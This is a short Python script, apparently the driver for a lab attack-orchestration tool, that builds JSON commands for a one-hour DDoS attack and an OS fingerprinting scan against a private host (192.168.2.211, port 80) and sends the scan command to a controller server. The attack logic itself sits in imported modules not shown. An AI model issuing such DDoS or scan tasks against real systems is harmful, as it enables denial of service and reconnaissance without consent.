from TransferMod.ClientMod import Client
from GlobalSetting import *
import json

def ProduceAttack():
    attackCommandDict = {}
    attackCommandDict["TaskType"] = "Attack"
    attackCommandDict["AttackType"] = "DDoS"
    attackCommandDict["DstIP"] = "192.168.2.211"
    attackCommandDict["DstPort"] = 80
    attackCommandDict["Intensity"] = 1
    attackCommandDict["LastTime"] = 3600
    attackCommandDict["TaskNode"] = 3
    attackCommand = json.dumps(attackCommandDict)

    scanCommandDict = {}
    scanCommandDict["TaskType"] = "Scan"
    scanCommandDict["ScanType"] = "OS"
    scanCommandDict["DstIP"] = "192.168.2.211"
    scanCommandDict["DstPort"] = 80
    scanCommand = json.dumps(scanCommandDict)

    client = Client(ServerSideIpAddr, ServerPort)
    client.send(scanCommand)
    client.recv()

    client.close()

if __name__ =="__main__":
    ProduceAttack()